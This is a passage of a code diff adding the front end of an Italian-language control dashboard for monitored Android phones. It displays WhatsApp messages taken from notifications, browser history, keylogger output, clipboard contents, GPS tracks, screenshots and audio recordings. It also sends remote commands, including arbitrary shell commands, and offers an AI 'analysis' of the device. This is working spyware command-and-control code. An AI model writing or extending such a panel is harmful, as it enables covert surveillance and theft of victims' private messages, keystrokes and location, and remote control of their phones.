+function renderLightboxItem() {
+  const f = lbItems[lbIndex];
+  if (!f) return;
+  const name = f.name || f.filename || f.file || '';
+  const isVid = /\.(mp4|mov|avi|3gp)$/i.test(name);
+  const url = `${API_BASE}/api/media/${currentDevice}/${encodeURIComponent(name)}?token=${TOKEN}`;
+  const container = document.getElementById('lb-media');
+  if (isVid) {
+    container.innerHTML = `<video src="${url}" controls autoplay style="max-width:100%;max-height:75vh;border-radius:6px"></video>`;
+  } else {
+    container.innerHTML = `<img src="${url}" alt="${escHtml(name)}" style="max-width:100%;max-height:75vh;object-fit:contain;border-radius:6px">`;
+  }
+  document.getElementById('lb-caption').textContent = `${name} (${lbIndex+1}/${lbItems.length})`;
+}
+
+// Lightbox touch swipe
+let lbTouchX = null;
+document.getElementById('lightbox').addEventListener('touchstart', e => { lbTouchX = e.touches[0].clientX; });
+document.getElementById('lightbox').addEventListener('touchend', e => {
+  if (lbTouchX === null) return;
+  const dx = e.changedTouches[0].clientX - lbTouchX;
+  if (Math.abs(dx) > 50) lbNav(dx < 0 ? 1 : -1);
+  lbTouchX = null;
+});
+
+// ─── WHATSAPP ────────────────────────────────────────────────────────────────
+async function loadWhatsApp() {
+  document.getElementById('wa-list').innerHTML = renderSkeletonList(5);
+  // Always reload: notification events can arrive while another dashboard tab is open.
+  const data = await apiFetch(`/api/events?deviceId=${currentDevice}&limit=10000`);
+  allEvents = Array.isArray(data) ? data : [];
+  allWA = allEvents.filter(e => {
+    const pkg = String(e.pkg || e.packageName || e.package || e.app || '').toLowerCase();
+    return pkg.includes('whatsapp') && !isWANoise(e);
+  }).sort((a,b) => (b.ts||b.timestamp||0) - (a.ts||a.timestamp||0));
+  renderWA();
+}
+
+function renderWA() {
+  const search = document.getElementById('wa-search').value.toLowerCase();
+  const filtered = search ? allWA.filter(e =>
+    String(e.body||e.text||e.message||'').toLowerCase().includes(search) ||
+    String(e.conversation||e.title||'').toLowerCase().includes(search) ||
+    String(e.sender||'').toLowerCase().includes(search)
+  ) : allWA;
+  const conversations = new Set(filtered.map(e => e.conversation || e.title || 'WhatsApp'));
+  const complete = filtered.filter(e => e.complete === true).length;
+  document.getElementById('wa-count').textContent = filtered.length + ' messaggi';
+  document.getElementById('wa-summary').innerHTML = `
+    <div class="device-info-row"><span class="lbl">Conversazioni</span><span class="val">${conversations.size}</span></div>
+    <div class="device-info-row"><span class="lbl">Messaggi strutturati completi</span><span class="val">${complete}</span></div>
+    <div style="font-size:11px;color:var(--text-secondary);padding-top:8px">Acquisisce i contenuti resi disponibili dalle notifiche WhatsApp. I messaggi senza notifica non possono comparire.</div>`;
+  if (!filtered.length) { document.getElementById('wa-list').innerHTML = emptyState('Nessun messaggio WhatsApp'); return; }
+  document.getElementById('wa-list').innerHTML = filtered.map(e => {
+    const conversation = escHtml(e.conversation || e.title || 'WhatsApp');
+    const sender = escHtml(e.sender || e.title || 'WhatsApp');
+    const text = escHtml(e.body || e.text || e.message || '');
+    const ts = e.ts || e.timestamp || e.time || e.createdAt;
+    const quality = e.complete === true ? 'Completo' : 'Testo notifica';
+    const qualityColor = e.complete === true ? 'var(--accent-green)' : 'var(--accent-yellow)';
+    return `<div class="wa-item">
+      <div class="wa-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="#25d366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347"/></svg></div>
+      <div class="wa-body">
+        <div class="wa-sender">${conversation}${sender !== conversation ? ` · ${sender}` : ''}</div>
+        <div class="wa-text" style="white-space:pre-wrap">${text}</div>
+        <div class="wa-time">${fmtDateFull(ts)} · <span style="color:${qualityColor}">${quality}</span>${e.app === 'WhatsApp Business' ? ' · Business' : ''}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterWA() { renderWA(); }
+
+// ─── BROWSER ─────────────────────────────────────────────────────────────────
+async function loadBrowser() {
+  document.getElementById('browser-list').innerHTML = renderSkeletonList(5);
+  const data = await apiFetch(`/api/browser/${currentDevice}`);
+  allBrowser = (data && (data.history || data)) || [];
+  if (!Array.isArray(allBrowser)) allBrowser = [];
+  renderBrowser();
+}
+
+function renderBrowser() {
+  const search = document.getElementById('browser-search').value.toLowerCase();
+  const filtered = search ? allBrowser.filter(b =>
+    (b.url||'').toLowerCase().includes(search) ||
+    (b.title||'').toLowerCase().includes(search)
+  ) : allBrowser;
+  document.getElementById('browser-count').textContent = filtered.length + ' pagine';
+  if (!filtered.length) { document.getElementById('browser-list').innerHTML = emptyState('Nessuna cronologia'); return; }
+  document.getElementById('browser-list').innerHTML = filtered.map(b => {
+    const url = escHtml(b.url || '');
+    const title = escHtml(b.title || url);
+    const ts = b.timestamp || b.time || b.date;
+    return `<div class="browser-item" onclick="window.open(${JSON.stringify(b.url||'#')},'_blank')">
+      <div class="browser-title">${title}</div>
+      <div class="browser-url">${url}</div>
+      <div class="browser-time">${fmtDateFull(ts)}</div>
+    </div>`;
+  }).join('');
+}
+
+function filterBrowser() { renderBrowser(); }
+
+// ─── KEYLOG ──────────────────────────────────────────────────────────────────
+async function loadKeylog() {
+  document.getElementById('keylog-list').innerHTML = renderSkeletonList(4);
+  const data = await apiFetch(`/api/keylog/${currentDevice}`);
+  allKeylog = (data && (data.entries || data.keylog || data)) || [];
+  if (!Array.isArray(allKeylog)) allKeylog = [];
+  renderKeylog();
+}
+
+function renderKeylog() {
+  const search = document.getElementById('keylog-search').value.toLowerCase();
+  const filtered = search ? allKeylog.filter(k =>
+    (k.text||k.keys||'').toLowerCase().includes(search) ||
+    (k.app||k.application||'').toLowerCase().includes(search)
+  ) : allKeylog;
+  document.getElementById('keylog-count').textContent = filtered.length + ' voci';
+  if (!filtered.length) { document.getElementById('keylog-list').innerHTML = emptyState('Nessun keylog'); return; }
+  document.getElementById('keylog-list').innerHTML = filtered.map(k => {
+    const app = escHtml(k.app || k.application || k.packageName || 'App sconosciuta');
+    const text = escHtml(k.text || k.keys || '');
+    const ts = k.timestamp || k.time;
+    return `<div class="keylog-item">
+      <div class="keylog-app">⌨️ ${app}</div>
+      <div class="keylog-text">${text}</div>
+      <div class="keylog-time">${fmtDateFull(ts)}</div>
+    </div>`;
+  }).join('');
+}
+
+function filterKeylog() { renderKeylog(); }
+
+// ─── CLIPBOARD ───────────────────────────────────────────────────────────────
+async function loadClipboard() {
+  document.getElementById('clipboard-list').innerHTML = renderSkeletonList(4);
+  const data = await apiFetch(`/api/clipboard/${currentDevice}`);
+  allClipboard = (data && (data.entries || data.clipboard || data)) || [];
+  if (!Array.isArray(allClipboard)) allClipboard = [];
+  renderClipboard();
+}
+
+function renderClipboard() {
+  const search = document.getElementById('clipboard-search').value.toLowerCase();
+  const filtered = search ? allClipboard.filter(c =>
+    (c.text||c.content||'').toLowerCase().includes(search)
+  ) : allClipboard;
+  document.getElementById('clipboard-count').textContent = filtered.length + ' voci';
+  if (!filtered.length) { document.getElementById('clipboard-list').innerHTML = emptyState('Nessun appunto'); return; }
+  document.getElementById('clipboard-list').innerHTML = filtered.map(c => {
+    const text = escHtml(c.text || c.content || '');
+    const ts = c.timestamp || c.time;
+    return `<div class="clip-item" onclick="navigator.clipboard && navigator.clipboard.writeText(${JSON.stringify(c.text||c.content||'')}).then(()=>toast('Copiato!','success',1500))">
+      <div class="clip-text">${text || '<em>Vuoto</em>'}</div>
+      <div class="clip-time">${fmtDateFull(ts)}</div>
+    </div>`;
+  }).join('');
+}
+
+function filterClipboard() { renderClipboard(); }
+
+// ─── APPS ────────────────────────────────────────────────────────────────────
+async function loadApps() {
+  document.getElementById('apps-list').innerHTML = renderSkeletonList(6);
+  const data = await apiFetch(`/api/apps/${currentDevice}`);
+  allApps = (data && (data.apps || data)) || [];
+  if (!Array.isArray(allApps)) allApps = [];
+  renderApps();
+}
+
+const APP_EMOJI = {
+  'com.whatsapp': '💬', 'org.telegram': '✈️', 'com.instagram.android': '📸',
+  'com.facebook': '👤', 'com.google.android.gm': '📧', 'com.spotify': '🎵',
+  'com.netflix': '🎬', 'com.twitter': '🐦', 'com.snapchat': '👻',
+  'com.tiktok': '🎵', 'com.youtube': '▶️', 'com.google.android.chrome': '🌐',
+  'com.samsung': '📱', 'com.android': '🤖',
+};
+
+function getAppEmoji(pkg) {
+  for (const [k,v] of Object.entries(APP_EMOJI)) {
+    if (pkg.toLowerCase().startsWith(k)) return v;
+  }
+  return '📦';
+}
+
+function renderApps() {
+  const search = document.getElementById('apps-search').value.toLowerCase();
+  const filtered = search ? allApps.filter(a =>
+    (a.name||a.appName||'').toLowerCase().includes(search) ||
+    (a.package||a.packageName||'').toLowerCase().includes(search)
+  ) : allApps;
+  document.getElementById('apps-count').textContent = filtered.length + ' app';
+  if (!filtered.length) { document.getElementById('apps-list').innerHTML = emptyState('Nessuna app'); return; }
+  document.getElementById('apps-list').innerHTML = filtered.map(a => {
+    const name = escHtml(a.name || a.appName || 'App');
+    const pkg = escHtml(a.package || a.packageName || '');
+    const ver = escHtml(a.version || a.versionName || '');
+    const emoji = getAppEmoji(pkg);
+    return `<div class="app-item">
+      <div class="app-icon">${emoji}</div>
+      <div style="flex:1;min-width:0">
+        <div class="app-name">${name}</div>
+        <div class="app-pkg">${pkg}</div>
+      </div>
+      <div class="app-ver">${ver}</div>
+    </div>`;
+  }).join('');
+}
+
+function filterApps() { renderApps(); }
+
+// ─── SHELL ───────────────────────────────────────────────────────────────────
+async function loadShell() {
+  const data = await apiFetch(`/api/shell/${currentDevice}`);
+  const outputs = (data && (data.outputs || data)) || [];
+  document.getElementById('shell-outputs').innerHTML = (Array.isArray(outputs) ? outputs : []).map(o => `
+    <div class="shell-output-item">
+      <div class="shell-cmd">${escHtml(o.command || o.cmd || '')}</div>
+      <div class="shell-out">${escHtml(o.output || o.result || o.stdout || '')}</div>
+      <div class="shell-time">${fmtDateFull(o.timestamp || o.time)}</div>
+    </div>`).join('') || '<div class="empty"><p>Nessun output shell</p></div>';
+}
+
+async function sendShellCmd() {
+  if (!currentDevice) { toast('Seleziona un dispositivo', 'error'); return; }
+  const inp = document.getElementById('shell-input');
+  const cmd = inp.value.trim();
+  if (!cmd) return;
+  inp.value = '';
+  toast('Invio comando...', 'info', 1500);
+  toast('Shell remota non supportata per sicurezza', 'error');
+  return;
+  if (r) { toast('Comando inviato', 'success'); setTimeout(() => loadShell(), 2000); }
+  else toast('Errore invio comando', 'error');
+}
+
+// ─── LOCATION ────────────────────────────────────────────────────────────────
+async function loadLocation() {
+  const data = await apiFetch(`/api/locations/${currentDevice}`);
+  const locations = Array.isArray(data) ? data : [];
+  document.getElementById('location-count').textContent = `${locations.length} posizioni`;
+  if (!locations.length) {
+    document.getElementById('location-latest').innerHTML = emptyState('Nessuna posizione ricevuta');
+    document.getElementById('location-list').innerHTML = '';
+    return;
+  }
+  const sorted = locations.slice().sort((a,b) => (b.ts||0)-(a.ts||0));
+  const last = sorted[0];
+  const maps = `https://www.openstreetmap.org/?mlat=${encodeURIComponent(last.lat)}&mlon=${encodeURIComponent(last.lng)}#map=17/${encodeURIComponent(last.lat)}/${encodeURIComponent(last.lng)}`;
+  document.getElementById('location-latest').innerHTML = `
+    <div class="card-title">Ultima posizione</div>
+    <div class="device-info-row"><span class="lbl">Coordinate</span><span class="val">${Number(last.lat).toFixed(6)}, ${Number(last.lng).toFixed(6)}</span></div>
+    <div class="device-info-row"><span class="lbl">Precisione</span><span class="val">${Math.round(Number(last.accuracy)||0)} m</span></div>
+    <div class="device-info-row"><span class="lbl">Ricevuta</span><span class="val">${fmtDateFull(last.ts)}</span></div>
+    <a href="${maps}" target="_blank" rel="noopener" style="display:block;margin-top:12px;color:var(--accent-blue)">Apri sulla mappa →</a>`;
+  document.getElementById('location-list').innerHTML = sorted.slice(0,100).map(l => `
+    <div class="device-info-row"><span class="lbl">${fmtDateFull(l.ts)}</span><span class="val">${Number(l.lat).toFixed(5)}, ${Number(l.lng).toFixed(5)} · ${Math.round(Number(l.accuracy)||0)}m</span></div>`).join('');
+}
+
+// ─── BATTERY ─────────────────────────────────────────────────────────────────
+async function loadBattery() {
+  const status = await apiFetch(`/api/status/${currentDevice}`);
+  const data = status && Object.keys(status).length ? [status] : [];
+  const entries = data;
+  if (!entries.length) {
+    document.getElementById('battery-current').textContent = 'Nessun dato';
+    document.getElementById('batt-entries').innerHTML = emptyState('Installa Nexus 2.0 per la diagnostica');
+    return;
+  }
+  const last = entries[entries.length - 1];
+  document.getElementById('battery-current').textContent =
+    `🔋 ${last.batteryPercent ?? '?'}% ${last.charging ? '⚡ In carica' : ''}`;
+  document.getElementById('battery-chart-svg').innerHTML = `<text x="150" y="60" text-anchor="middle" fill="var(--accent-green)" font-size="24" font-weight="700">${last.batteryPercent ?? '?'}%</text>`;
+  const yesNo = v => v ? '✓' : '✗';
+  document.getElementById('batt-entries').innerHTML = `
+    <div class="device-info-row"><span class="lbl">Temperatura</span><span class="val">${last.batteryTemperatureC ?? '—'} °C</span></div>
+    <div class="device-info-row"><span class="lbl">RAM disponibile</span><span class="val">${fmtBytes(last.memoryAvailableBytes)}</span></div>
+    <div class="device-info-row"><span class="lbl">Storage libero</span><span class="val">${fmtBytes(last.storageFreeBytes)}</span></div>
+    <div class="device-info-row"><span class="lbl">Rete</span><span class="val">${escHtml(last.network || '—')}</span></div>
+    <div class="device-info-row"><span class="lbl">Accessibilità</span><span class="val">${yesNo(last.accessibilityEnabled)}</span></div>
+    <div class="device-info-row"><span class="lbl">Notifiche</span><span class="val">${yesNo(last.notificationListenerEnabled)}</span></div>
+    <div class="device-info-row"><span class="lbl">Cartella SD</span><span class="val">${yesNo(last.externalTreeAuthorized)}</span></div>
+    <div class="device-info-row"><span class="lbl">Versione Nexus</span><span class="val">${escHtml(last.appVersion || '—')}</span></div>`;
+}
+
+function renderBatteryChart(entries) {
+  const svg = document.getElementById('battery-chart-svg');
+  const W = 300, H = 120, padX = 30, padY = 10;
+  const pts = entries.slice(-60);
+  if (pts.length < 2) { svg.innerHTML = '<text x="150" y="60" text-anchor="middle" fill="var(--text-secondary)" font-size="11">Dati insufficienti</text>'; return; }
+  const levels = pts.map(p => p.level ?? 0);
+  const step = (W - padX*2) / (pts.length - 1);
+  const toY = v => padY + ((100 - v) / 100) * (H - padY*2 - 15);
+  const points = pts.map((p, i) => `${(padX + i*step).toFixed(1)},${toY(p.level??0).toFixed(1)}`);
+  const areaPath = `M${padX},${toY(0)} L${points.join(' L')} L${(padX+(pts.length-1)*step).toFixed(1)},${toY(0)} Z`;
+  const linePath = `M${points.join(' L')}`;
+  const lastPct = levels[levels.length-1];
+  const gradColor = lastPct > 50 ? '#10b981' : lastPct > 20 ? '#f59e0b' : '#ef4444';
+  svg.innerHTML = `
+    <defs>
+      <linearGradient id="battGrad" x1="0" y1="0" x2="0" y2="1">
+        <stop offset="0%" stop-color="${gradColor}" stop-opacity=".4"/>
+        <stop offset="100%" stop-color="${gradColor}" stop-opacity=".02"/>
+      </linearGradient>
+    </defs>
+    <text x="${padX}" y="${H-2}" font-size="9" fill="var(--text-secondary)">0%</text>
+    <text x="${padX}" y="${toY(100)+4}" font-size="9" fill="var(--text-secondary)">100%</text>
+    <line x1="${padX}" y1="${toY(0)}" x2="${W-padX}" y2="${toY(0)}" stroke="var(--border)" stroke-width="1"/>
+    <line x1="${padX}" y1="${toY(100)}" x2="${W-padX}" y2="${toY(100)}" stroke="var(--border)" stroke-width="1" stroke-dasharray="3,3"/>
+    <path d="${areaPath}" fill="url(#battGrad)"/>
+    <path d="${linePath}" fill="none" stroke="${gradColor}" stroke-width="2" stroke-linejoin="round"/>
+    <circle cx="${(padX+(pts.length-1)*step).toFixed(1)}" cy="${toY(lastPct).toFixed(1)}" r="4" fill="${gradColor}"/>
+    <text x="${(padX+(pts.length-1)*step+6).toFixed(1)}" y="${(toY(lastPct)+4).toFixed(1)}" font-size="10" fill="${gradColor}" font-weight="700">${lastPct}%</text>
+  `;
+}
+
+// ─── SCREENSHOTS ─────────────────────────────────────────────────────────────
+async function loadScreenshots() {
+  document.getElementById('screenshots-grid').innerHTML = renderSkeletonGallery2();
+  const data = await apiFetch(`/api/screenshot/${currentDevice}`);
+  const files = (data && (data.files || data)) || [];
+  document.getElementById('screenshots-count').textContent = (Array.isArray(files)?files:[]).length + ' screenshot';
+  lbItems = Array.isArray(files) ? files : [];
+  if (!lbItems.length) { document.getElementById('screenshots-grid').innerHTML = emptyState('Nessuno screenshot'); return; }
+  document.getElementById('screenshots-grid').innerHTML = lbItems.map((f,i) => {
+    const name = f.name || f.filename || f.file || '';
+    const url = `${API_BASE}/api/screenshot/${currentDevice}/${encodeURIComponent(name)}?token=${TOKEN}`;
+    return `<div class="file-card" onclick="openScreenshotLb(${i})">
+      <img src="${url}" alt="${escHtml(name)}" loading="lazy" onerror="this.style.display='none'">
+      <div class="file-card-info">
+        <div class="file-card-name">${escHtml(name)}</div>
+        <div class="file-card-size">${fmtBytes(f.size)} · ${timeAgo(f.timestamp||f.time)}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function openScreenshotLb(idx) {
+  const f = lbItems[idx];
+  if (!f) return;
+  const name = f.name || f.filename || f.file || '';
+  const url = `${API_BASE}/api/screenshot/${currentDevice}/${encodeURIComponent(name)}?token=${TOKEN}`;
+  lbIndex = idx;
+  document.getElementById('lb-media').innerHTML = `<img src="${url}" style="max-width:100%;max-height:75vh;object-fit:contain;border-radius:6px">`;
+  document.getElementById('lb-caption').textContent = `${name} (${idx+1}/${lbItems.length})`;
+  document.getElementById('lightbox').classList.add('open');
+}
+
+// ─── AUDIO ───────────────────────────────────────────────────────────────────
+async function loadAudio() {
+  document.getElementById('audio-list').innerHTML = renderSkeletonList(3);
+  const data = await apiFetch(`/api/audio/${currentDevice}`);
+  const files = (data && (data.files || data)) || [];
+  document.getElementById('audio-count').textContent = (Array.isArray(files)?files:[]).length + ' file';
+  if (!Array.isArray(files) || !files.length) { document.getElementById('audio-list').innerHTML = emptyState('Nessuna registrazione'); return; }
+  document.getElementById('audio-list').innerHTML = files.map(f => {
+    const name = f.name || f.filename || f.file || '';
+    const url = `${API_BASE}/api/audio/${currentDevice}/${encodeURIComponent(name)}?token=${TOKEN}`;
+    return `<div class="audio-card">
+      <div class="audio-name">🎙️ ${escHtml(name)}</div>
+      <div class="audio-meta">${fmtBytes(f.size)} · ${fmtDateFull(f.timestamp||f.time)}</div>
+      <audio controls src="${url}" preload="none"></audio>
+    </div>`;
+  }).join('');
+}
+
+// ─── COMMANDS ────────────────────────────────────────────────────────────────
+async function sendCommand(type) {
+  if (!currentDevice) { toast('Seleziona un dispositivo', 'error'); return; }
+  const log = document.getElementById('cmd-log');
+  const ts = fmtTime(Date.now());
+  log.innerHTML = `<div class="cmd-log-item">⏳ [${ts}] Invio ${type}...</div>` + log.innerHTML;
+  toast(`Invio ${type}...`, 'info', 1500);
+  const r = await apiFetch(`/api/commands/${currentDevice}`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({type})
+  });
+  if (r) {
+    log.innerHTML = `<div class="cmd-log-item ok">✅ [${fmtTime(Date.now())}] ${type}: OK</div>` + log.innerHTML;
+    toast(`${type} inviato`, 'success');
+  } else {
+    log.innerHTML = `<div class="cmd-log-item err">❌ [${fmtTime(Date.now())}] ${type}: Errore</div>` + log.innerHTML;
+    toast(`Errore: ${type}`, 'error');
+  }
+}
+
+function sendShellFromCmd() {
+  const inp = document.getElementById('cmd-shell-input');
+  const cmd = inp.value.trim();
+  if (!cmd) return;
+  if (!currentDevice) { toast('Seleziona un dispositivo', 'error'); return; }
+  inp.value = '';
+  const log = document.getElementById('cmd-log');
+  log.innerHTML = `<div class="cmd-log-item">⏳ shell: ${escHtml(cmd)}</div>` + log.innerHTML;
+  apiFetch(`/api/commands/${currentDevice}`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({type:'shell', command:cmd})
+  }).then(r => {
+    if (r) {
+      log.innerHTML = `<div class="cmd-log-item ok">✅ shell OK</div>` + log.innerHTML;
+      toast('Comando inviato', 'success');
+    } else {
+      log.innerHTML = `<div class="cmd-log-item err">❌ shell: Errore</div>` + log.innerHTML;
+      toast('Errore invio', 'error');
+    }
+  });
+}
+
+// ─── AI ──────────────────────────────────────────────────────────────────────
+async function loadAI() {
+  const section = document.getElementById('ai-briefing-section');
+  section.innerHTML = '<div class="skel skel-line w80"></div><div class="skel skel-line w60"></div>';
+  const data = await apiFetch(`/api/ai/analyze/${currentDevice}`);
+  if (data && data.briefing) {
+    section.innerHTML = `<div class="ai-briefing"><div class="ai-briefing-label">🤖 Analisi AI del dispositivo</div>${escHtml(data.briefing)}</div>`;
+  } else {
+    section.innerHTML = '';
+  }
+}
+
+async function sendAIMessage() {
+  if (!currentDevice) { toast('Seleziona un dispositivo', 'error'); return; }
+  const inp = document.getElementById('ai-input');
+  const msg = inp.value.trim();
+  if (!msg) return;
+  inp.value = '';
+  appendAIMessage('user', msg);
+  appendAIMessage('bot', '⏳ Elaborazione...');
+  const r = await apiFetch('/api/ai/chat', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({deviceId: currentDevice, message: msg})
+  });
+  const msgs = document.getElementById('ai-chat-messages');
+  const typing = msgs.lastElementChild;
+  if (typing) typing.remove();
+  if (r && r.reply) appendAIMessage('bot', r.reply);
+  else appendAIMessage('bot', '❌ Errore nella risposta AI');
+}
+
+function appendAIMessage(role, text) {
+  const el = document.getElementById('ai-chat-messages');
+  const div = document.createElement('div');
+  div.className = `ai-msg ${role}`;
+  div.innerHTML = `<div class="bubble" style="max-width:85%;padding:10px 14px;border-radius:16px;font-size:13px;line-height:1.5;${role==='user'?'margin-left:auto':'margin-right:auto'}">${escHtml(text)}</div>`;
+  el.appendChild(div);
+  el.scrollTop = el.scrollHeight;
+}
+
+// ─── WEBSOCKET ───────────────────────────────────────────────────────────────
+function connectWS() {
+  if (ws) { ws.close(); ws = null; }
+  clearInterval(wsHeartbeat);
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  const host = location.host;
+  const wsProto = proto;
+  try {
+    ws = new WebSocket(`${wsProto}://${host}/ws?token=${TOKEN}&deviceId=${currentDevice||''}`);
+  } catch(e) { return; }
+
+  const statusEl = document.getElementById('ws-status');
+
+  ws.onopen = () => {
+    statusEl.classList.add('connected');
+    wsHeartbeat = setInterval(() => {
+      if (ws && ws.readyState === 1) ws.send(JSON.stringify({type:'ping',ts:Date.now()}));
+    }, 25000);
+  };
+
+  ws.onmessage = e => {
+    try {
+      const data = JSON.parse(e.data);
+      handleWSMessage(data);
+    } catch(err) {}
+  };
+
+  ws.onclose = () => {
+    statusEl.classList.remove('connected');
+    clearInterval(wsHeartbeat);
+    setTimeout(connectWS, 5000);
+  };
+
+  ws.onerror = () => {
+    statusEl.classList.remove('connected');
+  };
+}
+
+function handleWSMessage(data) {
+  if (data && data.event) data = { type: data.event, ...(data.data || {}) };
+  if (!data || data.type === 'pong') return;
+  if (data.type === 'event' || data.type === 'notification') {
+    const id = data.id || data._id || `${data.timestamp}_${data.app}`;
+    if (seenEventIds.has(id)) return;
+    seenEventIds.add(id);
+    const app = data.app || data.packageName || 'Notifica';
+    const text = data.text || data.message || data.body || '';
+    toast(`📱 ${app}: ${text.substring(0,60)}`, 'info', 4000);
+    allEvents.unshift(data);
+    if (currentTab === 'activity') renderActivity();
+    if (currentTab === 'home') renderHomeRecentEvents(allEvents.slice(0, 5));
+  } else if (data.type === 'device_update') {
+    const idx = devices.findIndex(d => (d.id||d.deviceId||d._id) === (data.deviceId||data.id));
+    if (idx >= 0) { devices[idx] = {...devices[idx], ...data}; }
+    if (data.deviceId === currentDevice || data.id === currentDevice) {
+      if (data.battery != null) {
+        document.getElementById('home-device-battery').textContent = `🔋 ${data.battery}%`;
+      }
+    }
+  }
+}
+
+// ─── SKELETON HELPERS ────────────────────────────────────────────────────────
+function renderSkeletonList(n) {
+  return `<div class="card">${Array(n).fill(0).map(() => `
+    <div style="display:flex;gap:10px;padding:10px 0;border-bottom:1px solid var(--border)">
+      <div class="skel" style="width:36px;height:36px;border-radius:50%;flex-shrink:0"></div>
+      <div style="flex:1">
+        <div class="skel skel-line w60"></div>
+        <div class="skel skel-line w80"></div>
+        <div class="skel skel-line w40"></div>
+      </div>
+    </div>`).join('')}</div>`;
+}
+
+function renderSkeletonGallery() {
+  return `<div class="gallery-grid">${Array(9).fill(0).map(() =>
+    `<div class="skel" style="aspect-ratio:1;border-radius:4px"></div>`
+  ).join('')}</div>`;
+}
+
+function renderSkeletonGallery2() {
+  return `<div class="file-grid">${Array(4).fill(0).map(() =>
+    `<div class="skel" style="aspect-ratio:16/9;border-radius:var(--radius-sm)"></div>`
+  ).join('')}</div>`;
+}
+
+function emptyState(msg) {
+  return `<div class="empty">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+    <p>${escHtml(msg)}</p>
+  </div>`;
+}
+
+// ─── INIT ─────────────────────────────────────────────────────────────────────
+(async function init() {
+  await loadDevices();
+  document.getElementById('home-no-device').style.display = devices.length ? 'none' : '';
+  if (!devices.length) {
+    document.getElementById('home-no-device').style.display = '';
+    document.getElementById('home-stats').style.display = 'none';
+    toast('Nessun dispositivo trovato — controlla la connessione', 'error', 5000);
+  }
+})();
+</script>
+</body>
+</html>
